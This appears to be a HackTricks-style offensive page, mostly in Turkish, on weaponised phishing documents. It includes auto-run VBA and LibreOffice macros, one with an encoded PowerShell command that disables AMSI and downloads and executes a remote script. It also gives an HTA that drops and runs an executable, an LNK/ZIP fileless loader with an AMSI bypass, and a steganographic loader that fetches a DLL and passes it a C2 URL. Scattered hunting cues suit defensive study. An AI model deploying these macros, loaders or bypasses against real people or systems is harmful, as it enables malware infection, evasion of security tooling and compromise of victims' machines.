# Phishing Files & Documents

{{#include ../../banners/hacktricks-training.md}}

## Office Documents

Microsoft Word, bir dosyayı açmadan önce dosya veri doğrulaması yapar. Veri doğrulaması, OfficeOpenXML standardına karşı veri yapısı tanımlaması biçiminde gerçekleştirilir. Veri yapısı tanımlaması sırasında herhangi bir hata oluşursa, analiz edilen dosya açılmaz.

Genellikle, macro içeren Word dosyaları `.docm` uzantısını kullanır. Ancak, dosya uzantısını değiştirerek dosyayı yeniden adlandırmak ve yine de macro çalıştırma yeteneklerini korumak mümkündür.\
Örneğin, RTF dosyası tasarım gereği macro desteklemez, ancak RTF olarak yeniden adlandırılan bir DOCM dosyası Microsoft Word tarafından işlenecek ve macro execution yapabilecektir.\
Aynı iç yapı ve mekanizmalar Microsoft Office Suite içindeki tüm yazılımlar için geçerlidir (Excel, PowerPoint etc.).

Bazı Office programları tarafından hangi uzantıların çalıştırılacağını kontrol etmek için aşağıdaki komutu kullanabilirsiniz:
```bash
assoc | findstr /i "word excel powerp"
```
DOCX dosyaları, makrolar içeren bir remote template’e referans verdiğinde (File –Options –Add-ins –Manage: Templates –Go) makroları da “execute” edebilir.

### External Image Load

Git: _Insert --> Quick Parts --> Field_\
_**Categories**: Links and References, **Filed names**: includePicture, ve **Filename or URL**:_ http://<ip>/whatever

![Office Documents - External Image Load: Go to: Insert -- Quick Parts -- Field](<../../images/image (155).png>)

### Macros Backdoor

Document içinden arbitrary code çalıştırmak için macros kullanmak mümkündür.

#### Autoload functions

Ne kadar yaygınlarsa, AV’nin onları detect etme ihtimali o kadar yüksektir.

- AutoOpen()
- Document_Open()

#### Macros Code Examples
```vba
Sub AutoOpen()
CreateObject("WScript.Shell").Exec ("powershell.exe -nop -Windowstyle hidden -ep bypass -enc JABhACAAPQAgACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAJwA7ACQAYgAgAD0AIAAnAG0AcwAnADsAJAB1ACAAPQAgACcAVQB0AGkAbABzACcACgAkAGEAcwBzAGUAbQBiAGwAeQAgAD0AIABbAFIAZQBmAF0ALgBBAHMAcwBlAG0AYgBsAHkALgBHAGUAdABUAHkAcABlACgAKAAnAHsAMAB9AHsAMQB9AGkAewAyAH0AJwAgAC0AZgAgACQAYQAsACQAYgAsACQAdQApACkAOwAKACQAZgBpAGUAbABkACAAPQAgACQAYQBzAHMAZQBtAGIAbAB5AC4ARwBlAHQARgBpAGUAbABkACgAKAAnAGEAewAwAH0AaQBJAG4AaQB0AEYAYQBpAGwAZQBkACcAIAAtAGYAIAAkAGIAKQAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwAKACQAZgBpAGUAbABkAC4AUwBlAHQAVgBhAGwAdQBlACgAJABuAHUAbABsACwAJAB0AHIAdQBlACkAOwAKAEkARQBYACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAwAC4AMQAxAC8AaQBwAHMALgBwAHMAMQAnACkACgA=")
End Sub
```

```vba
Sub AutoOpen()

Dim Shell As Object
Set Shell = CreateObject("wscript.shell")
Shell.Run "calc"

End Sub
```

```vba
Dim author As String
author = oWB.BuiltinDocumentProperties("Author")
With objWshell1.Exec("powershell.exe -nop -Windowsstyle hidden -Command-")
.StdIn.WriteLine author
.StdIn.WriteBlackLines 1
```

```vba
Dim proc As Object
Set proc = GetObject("winmgmts:\\.\root\cimv2:Win32_Process")
proc.Create "powershell <beacon line generated>
```
#### Manually remove metadata

Fo to **File > Info > Inspect Document > Inspect Document**, which will bring up the Document Inspector. Click **Inspect** and then **Remove All** next to **Document Properties and Personal Information**.

#### Doc Extension

When finished, select **Save as type** dropdown, change the format from **`.docx`** to **Word 97-2003 `.doc`**.\
Do this because you **can't save macro's inside a `.docx`** and there's a **stigma** **around** the macro-enabled **`.docm`** extension (e.g. the thumbnail icon has a huge `!` and some web/email gateway block them entirely). Therefore, this **legacy `.doc` extension is the best compromise**.

#### Malicious Macros Generators

- MacOS
- [**macphish**](https://github.com/cldrn/macphish)
- [**Mythic Macro Generator**](https://github.com/cedowens/Mythic-Macro-Generator)

## LibreOffice ODT auto-run macros (Basic)

LibreOffice Writer documents can embed Basic macros and auto-execute them when the file is opened by binding the macro to the **Open Document** event (Tools → Customize → Events → Open Document → Macro…). A simple reverse shell macro looks like:
```vb
Sub Shell
Shell("cmd /c powershell -enc BASE64_PAYLOAD"""")
End Sub
```
Note the doubled quotes (`""`) inside the string – LibreOffice Basic bunları literal tırnakları escape etmek için kullanır, bu yüzden `...==""")` ile biten payload'lar hem iç komutu hem de Shell argümanını dengeli tutar.

Delivery tips:

- `.odt` olarak kaydedin ve makroyu belge olayına bağlayın, böylece açıldığında hemen çalışır.
- `swaks` ile email gönderirken `--attach @resume.odt` kullanın (`@`, dosya baytlarının, dosya adı stringinin değil, ek olarak gönderilmesi için gereklidir). Bu, doğrulama yapmadan keyfi `RCPT TO` alıcılarını kabul eden SMTP sunucularını abuse ederken kritiktir.

## HTA Files

Bir HTA, **HTML ve scripting languages (such as VBScript and JScript)** birleşimi olan bir Windows programıdır. Kullanıcı arayüzünü oluşturur ve tarayıcının security model kısıtlamaları olmadan "fully trusted" bir uygulama olarak çalıştırır.

Bir HTA, genellikle **Internet Explorer** ile birlikte **installed** olan **`mshta.exe`** kullanılarak çalıştırılır; bu da `mshta`'nın IE'ye bağımlı olduğu anlamına gelir. Bu yüzden kaldırılmışsa, HTA'lar çalıştırılamaz.
```html
<--! Basic HTA Execution -->
<html>
<head>
<title>Hello World</title>
</head>
<body>
<h2>Hello World</h2>
<p>This is an HTA...</p>
</body>

<script language="VBScript">
Function Pwn()
Set shell = CreateObject("wscript.Shell")
shell.run "calc"
End Function

Pwn
</script>
</html>
```

```html
<--! Cobal Strike generated HTA without shellcode -->
<script language="VBScript">
Function var_func()
var_shellcode = "<shellcode>"

Dim var_obj
Set var_obj = CreateObject("Scripting.FileSystemObject")
Dim var_stream
Dim var_tempdir
Dim var_tempexe
Dim var_basedir
Set var_tempdir = var_obj.GetSpecialFolder(2)
var_basedir = var_tempdir & "\" & var_obj.GetTempName()
var_obj.CreateFolder(var_basedir)
var_tempexe = var_basedir & "\" & "evil.exe"
Set var_stream = var_obj.CreateTextFile(var_tempexe, true , false)
For i = 1 to Len(var_shellcode) Step 2
var_stream.Write Chr(CLng("&H" & Mid(var_shellcode,i,2)))
Next
var_stream.Close
Dim var_shell
Set var_shell = CreateObject("Wscript.Shell")
var_shell.run var_tempexe, 0, true
var_obj.DeleteFile(var_tempexe)
var_obj.DeleteFolder(var_basedir)
End Function

var_func
self.close
</script>
```
## NTLM Authentication Zorlaması

**NTLM authentication**'ı "uzaktan" **zorlamanın** birkaç yolu vardır; örneğin, kullanıcının erişeceği e-postalara veya HTML’ye **görünmez görüntüler** ekleyebilirsiniz (hatta HTTP MitM?). Ya da kurbana, yalnızca **klasörü açtığında** bir **authentication** tetikleyecek dosyaların **adresini** gönderebilirsiniz.

**Bu fikirleri ve daha fazlasını aşağıdaki sayfalarda kontrol edin:**


{{#ref}}
../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md
{{#endref}}


{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### NTLM Relay

Yalnızca hash’i veya authentication’ı çalamayacağınızı, aynı zamanda **NTLM relay attacks** da gerçekleştirebileceğinizi unutmayın:

- [**NTLM Relay attacks**](../pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#ntml-relay-attack)
- [**AD CS ESC8 (NTLM relay to certificates)**](../../windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md#ntlm-relay-to-ad-cs-http-endpoints-esc8)

## LNK Loaders + ZIP-Embedded Payloads (fileless chain)

Yüksek etkili kampanyalar, iki meşru kandırma belgesi (PDF/DOCX) ve kötü amaçlı bir .lnk içeren bir ZIP teslim eder. Hile, asıl PowerShell loader’ın ZIP’in ham baytlarının içinde, benzersiz bir işaretçiden sonra saklanmasıdır ve .lnk bunu tamamen memory içinde çıkarıp çalıştırır.

.lnk PowerShell tek satırlık komutu tarafından uygulanan tipik akış:

1) Orijinal ZIP’i yaygın konumlarda bulun: Desktop, Downloads, Documents, %TEMP%, %ProgramData% ve mevcut çalışma dizininin üst dizini.
2) ZIP baytlarını okuyun ve sabit kodlanmış bir işaretçi bulun (örn. xFIQCV). İşaretçiden sonraki her şey gömülü PowerShell payload’ıdır.
3) ZIP’i %ProgramData%’ya kopyalayın, orada çıkarın ve meşru görünmesi için kandırma .docx dosyasını açın.
4) Geçerli process için AMSI’yi bypass edin: [System.Management.Automation.AmsiUtils]::amsiInitFailed = $true
5) Son aşamayı deobfuscate edin (örn. tüm # karakterlerini kaldırın) ve memory içinde çalıştırın.

Gömülü aşamayı çıkarıp çalıştırmak için örnek PowerShell iskeleti:
```powershell
$marker   = [Text.Encoding]::ASCII.GetBytes('xFIQCV')
$paths    = @(
"$env:USERPROFILE\Desktop", "$env:USERPROFILE\Downloads", "$env:USERPROFILE\Documents",
"$env:TEMP", "$env:ProgramData", (Get-Location).Path, (Get-Item '..').FullName
)
$zip = Get-ChildItem -Path $paths -Filter *.zip -ErrorAction SilentlyContinue -Recurse | Sort-Object LastWriteTime -Descending | Select-Object -First 1
if(-not $zip){ return }
$bytes = [IO.File]::ReadAllBytes($zip.FullName)
$idx   = [System.MemoryExtensions]::IndexOf($bytes, $marker)
if($idx -lt 0){ return }
$stage = $bytes[($idx + $marker.Length) .. ($bytes.Length-1)]
$code  = [Text.Encoding]::UTF8.GetString($stage) -replace '#',''
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
Invoke-Expression $code
```
Notes
- Delivery sıklıkla saygın PaaS alt alan adlarını kötüye kullanır (örn. *.herokuapp.com) ve payload’ları filtreleyebilir (IP/UA’ya göre zararsız ZIP’ler sunar).
- Son aşama çoğunlukla base64/XOR shellcode’u decrypt eder ve disk artifacts’ini en aza indirmek için onu Reflection.Emit + VirtualAlloc ile çalıştırır.

Persistence used in the same chain
- Microsoft Web Browser control üzerinde COM TypeLib hijacking; böylece IE/Explorer veya onu embed eden herhangi bir app payload’ı otomatik olarak yeniden başlatır. Ayrıntılar ve hazır kullanılabilir komutlar burada:

{{#ref}}
../../windows-hardening/windows-local-privilege-escalation/com-hijacking.md
{{#endref}}

Hunting/IOCs
- Arşiv verisine eklenmiş ASCII marker string (örn. xFIQCV) içeren ZIP dosyaları.
- ZIP’i bulmak için parent/user klasörlerini enumerate eden ve bir decoy document açan .lnk.
- [System.Management.Automation.AmsiUtils]::amsiInitFailed üzerinden AMSI tampering.
- Trusted PaaS domains altında barındırılan linklerle biten uzun süreli business threads.

## LNK decoy-first staging → scheduled-task persistence → trusted CPL side-loading

Bir diğer tekrarlayan pattern, arka planda gerçek chain’i stage ederken hemen zararsız bir lure açan **document-impersonating `.lnk`**’dir.

Gözlenen workflow:
1. Kısayol **PDF gibi görünür** ve obfuscated bir PowerShell downloader başlatmak için `conhost.exe` veya benzer bir proxy kullanır.
2. PowerShell, belirgin token’ları parçalar (`iw''r`, `g''c''i`, `r''e''n`, `c''p''i`, `&(g''cm sch*)`) böylece `iwr`, `gci`, `ren`, `cpi` veya `schtasks` arayan basit detections komutu kaçırır.
3. Stager önce **decoy document**’ı indirir, kurban için açar ve ardından malicious dosyaları arka planda yeniden oluşturur.
4. Payload’lar **junk extensions** ile yazılabilir ve sonra filler karakterleri silinerek yeniden adlandırılır; böylece belirgin `.exe` / `.cpl` artifacts’inin görünmesi gecikir.
5. Persistence, user-writable bir path’ten trusted host binary başlatan **minute-based scheduled task** ile kurulur.

Bu pattern’den minimal hunting clues:
```powershell
# Suspicious split-token PowerShell seen in LNK chains
iw''r
r''e''n
&(g''cm sch*) /create /Sc minute /tn GoogleErrorReport /tr "$env:PUBLIC\Fondue"
```
Fark edilmeye değer kullanışlı bir staging düzeni şudur:
- `C:\Users\Public\<decoy>.pdf`
- `C:\Users\Public\<trusted>.exe`
- `C:\Users\Public\<malicious>.cpl` or `.dll`
- `C:\Windows\Tasks\<blob>.dat`

### İkinci stage neden stealthy

Rapid7 vaka incelemesinde, scheduled task sürekli olarak **`Fondue.exe`** dosyasını `C:\Users\Public\` içinden çalıştırıyordu. **`APPWIZ.cpl`** yanında stage edildiği ve **`RunFODW`** export ettiği için, trusted Microsoft binary saldırganın CPL dosyasını meşru sistem kopyası yerine side-load etti.

CPL ardından şunları yaptı:
- `C:\Windows\Tasks\editor.dat` içindeki bir **AES-256-CBC** blobunu okur
- Onu **Windows CNG / `bcrypt.dll`** üzerinden decrypt eder
- Executable memory ayırır ve decrypted shellcode’u kopyalar
- Shellcode pointer’ını **`EnumUILanguagesW`** için callback olarak geçirerek onu dolaylı biçimde execute eder

Bu son adım ayrı bir şekilde hunting etmeye değer: malware çoğu zaman doğrudan `((void(*)())buf)()` jump’ından kaçınır ve execution’ı aktarmak için **meşru bir callback alan WinAPI**’yi suistimal eder.

Bu kampanyadaki decrypted payload **Donut** shellcode’du; bu da final PE’yi tamamen memory içinde map etti ve execution’ı devretmeden önce current process içinde **AMSI/WLDP/ETW** patchledi. Side-loading ve memory-resident post-processing hakkında daha derin notlar için şunlara bakın:

{{#ref}}
../../windows-hardening/windows-local-privilege-escalation/dll-hijacking/README.md
{{#endref}}

{{#ref}}
../../windows-hardening/av-bypass.md
{{#endref}}

Pratik hunting pivotları:
- `.lnk` dosyasının `powershell.exe` veya `conhost.exe` başlatması ve ardından görünür bir decoy document gelmesi.
- **`C:\Users\Public\`** içine kısa ömürlü downloads ve hemen ardından anlamsız extension’lardan yeniden adlandırmalar.
- `GoogleErrorReport` gibi sade isimli scheduled task’lerin **user-writable directories** içinden çalışması.
- Trusted binary’lerin aynı non-system directory içinden **`.cpl` / `.dll`** dosyaları yüklemesi.
- **`C:\Windows\Tasks\`** altında yazılmış Base64 text blob’ları ve ardından side-loaded module tarafından okunmaları.

## Resimlerde steganography ile ayrılmış payload’lar (PowerShell stager)

Son loader zincirleri, Base64 PowerShell stager’ını çözüp çalıştıran obfuscated JavaScript/VBS teslim ediyor. Bu stager bir image (çoğunlukla GIF) indirir; bu image, düz text olarak benzersiz başlangıç/bitiş marker’ları arasında gizlenmiş Base64-encoded bir .NET DLL içerir. Script bu delimiters’ları arar (sahada görülen örnekler: «<<sudo_png>> … <<sudo_odt>>>»), aradaki metni çıkarır, onu Base64-decode ederek byte’lara dönüştürür, assembly’yi in-memory yükler ve C2 URL’si ile bilinen bir entry method’u çağırır.

Workflow
- Stage 1: Archived JS/VBS dropper → embedded Base64’i decode eder → `-nop -w hidden -ep bypass` ile PowerShell stager’ını başlatır.
- Stage 2: PowerShell stager → image indirir, marker-delimited Base64’i çıkarır, .NET DLL’i in-memory yükler ve method’unu (örn. VAI) C2 URL’si ve options geçirerek çağırır.
- Stage 3: Loader final payload’u alır ve genellikle process hollowing ile trusted binary içine inject eder (çoğunlukla MSBuild.exe). Process hollowing ve trusted utility proxy execution hakkında daha fazlası burada:

{{#ref}}
../../reversing/common-api-used-in-malware.md
{{#endref}}

Bir image içinden DLL çıkarmak ve .NET method’unu in-memory çağırmak için PowerShell örneği:

<details>
<summary>PowerShell stego payload extractor and loader</summary>
```powershell
# Download the carrier image and extract a Base64 DLL between custom markers, then load and invoke it in-memory
param(
[string]$Url    = 'https://example.com/payload.gif',
[string]$StartM = '<<sudo_png>>',
[string]$EndM   = '<<sudo_odt>>',
[string]$EntryType = 'Loader',
[string]$EntryMeth = 'VAI',
[string]$C2    = 'https://c2.example/payload'
)
$img = (New-Object Net.WebClient).DownloadString($Url)
$start = $img.IndexOf($StartM)
$end   = $img.IndexOf($EndM)
if($start -lt 0 -or $end -lt 0 -or $end -le $start){ throw 'markers not found' }
$b64 = $img.Substring($start + $StartM.Length, $end - ($start + $StartM.Length))
$bytes = [Convert]::FromBase64String($b64)
$asm = [Reflection.Assembly]::Load($bytes)
$type = $asm.GetType($EntryType)
$method = $type.GetMethod($EntryMeth, [Reflection.BindingFlags] 'Public,Static,NonPublic')
$null = $method.Invoke($null, @($C2, $env:PROCESSOR_ARCHITECTURE))
```
</details>

Notlar
- Bu, ATT&CK T1027.003 (steganography/marker-hiding). Marker'lar kampanyalar arasında değişir.
- AMSI/ETW bypass ve string deobfuscation genellikle assembly yüklenmeden önce uygulanır.
- Hunting: indirilen resimlerde bilinen ayırıcıları tara; PowerShell’in resimlere erişip hemen Base64 blob’larını decode etmesini tespit et.

Ayrıca stego tools ve carving techniques için bkz:

{{#ref}}
../../stego/workflow/README.md#quick-triage-checklist-first-10-minutes
{{#endref}}

## JS/VBS droppers → Base64 PowerShell staging

Yinelenen bir ilk aşama, bir archive içinde teslim edilen küçük, yoğun biçimde obfuscated bir `.js` veya `.vbs` dosyasıdır. Tek amacı, gömülü bir Base64 string’i decode etmek ve `-nop -w hidden -ep bypass` ile PowerShell başlatıp HTTPS üzerinden bir sonraki aşamayı bootstrap etmektir.

Skeleton logic (abstract):
- Kendi file contents'ını oku
- Junk string'ler arasında bir Base64 blob'u bul
- ASCII PowerShell’e decode et
- `wscript.exe`/`cscript.exe` ile `powershell.exe` çalıştır

Hunting cues
- Archive edilmiş JS/VBS attachments, command line’da `-enc`/`FromBase64String` ile `powershell.exe` başlatıyor.
- `wscript.exe`, user temp paths içinden `powershell.exe -nop -w hidden` çalıştırıyor.

## Windows files to steal NTLM hashes

**NTLM creds çalmak için yerler** sayfasına bakın:

{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}


## References

- [HTB Job – LibreOffice macro → IIS webshell → GodPotato](https://0xdf.gitlab.io/2026/01/26/htb-job.html)
- [Check Point Research – ZipLine Campaign: A Sophisticated Phishing Attack Targeting US Companies](https://research.checkpoint.com/2025/zipline-phishing-campaign/)
- [Rapid7 – Malware à la Mode: Tracking Dropping Elephant Tradecraft Through a China-Themed Loader Chain](https://www.rapid7.com/blog/post/tr-malware-tracking-dropping-elephant-tradecraft-china-themed-loader-chain)
- [Hijack the TypeLib – New COM persistence technique (CICADA8)](https://cicada-8.medium.com/hijack-the-typelib-new-com-persistence-technique-32ae1d284661)
- [Unit 42 – PhantomVAI Loader Delivers a Range of Infostealers](https://unit42.paloaltonetworks.com/phantomvai-loader-delivers-infostealers/)
- [MITRE ATT&CK – Steganography (T1027.003)](https://attack.mitre.org/techniques/T1027/003/)
- [MITRE ATT&CK – Process Hollowing (T1055.012)](https://attack.mitre.org/techniques/T1055/012/)
- [MITRE ATT&CK – Trusted Developer Utilities Proxy Execution: MSBuild (T1127.001)](https://attack.mitre.org/techniques/T1127/001/)

{{#include ../../banners/hacktricks-training.md}}
